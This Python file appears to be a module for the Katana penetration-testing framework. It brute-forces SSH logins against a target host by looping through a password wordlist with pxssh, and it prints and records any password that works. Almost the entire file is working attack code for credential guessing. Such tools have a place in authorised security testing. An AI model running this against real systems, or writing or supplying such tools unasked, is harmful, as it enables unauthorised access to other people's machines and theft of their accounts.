# This module requires katana framework 
# https://github.com/RedToor/Katana

# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Katana Core import                  #
from core.KatanaFramework import *    #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #

# LIBRARIES
from pexpect import pxssh
# END LIBRARIES

# INFORMATION MODULE
def init():
	init.Author             ="RedToor"
	init.Version            ="1.1"
	init.Despcription       ="Brute Force to SSH protocol."
	init.CodeName           ="btf/pr.ssh"
	init.DateCreation       ="07/03/2015"      
	init.LastModification   ="27/12/2016"
	init.References         =None
	init.License            =KTF_LINCENSE
	init.var                ={}

	# DEFAULT OPTIONS MODULE
	init.options = {
		# NAME    VALUE                RQ     DESCRIPTION
		'target':[LOCAL_IP            ,True ,'Host Target'],
		'port'  :[SSH_PORT            ,False,'Port Target'],
		'user'  :[USERNAME            ,True ,'Username target'],
		'dict'  :[DITIONARY_PASSWORDS ,False,'Wordlist']
	}
	return init
# END INFORMATION MODULE

# CODE MODULE    ############################################################################################
def main(run):
	NET.CheckConnectionHost(init.var['target'],init.var['port'],5)
	Loadingfile(init.var['dict'])

	with open(init.var['dict'],'r') as passwords:
		for password in passwords:
			password=password.replace("\n","")
			try:
				connect = pxssh.pxssh()
				connect.login(init.var['target'],init.var['user'],password)				
				if True:
					printk.suff("Successfully with ["+init.var['user']+"]["+password+"]\n")
					UTIL.sRegister(init,password)
					return
			except:printk.inf(" | Checking '"+password+"'")

# END CODE MODULE ############################################################################################
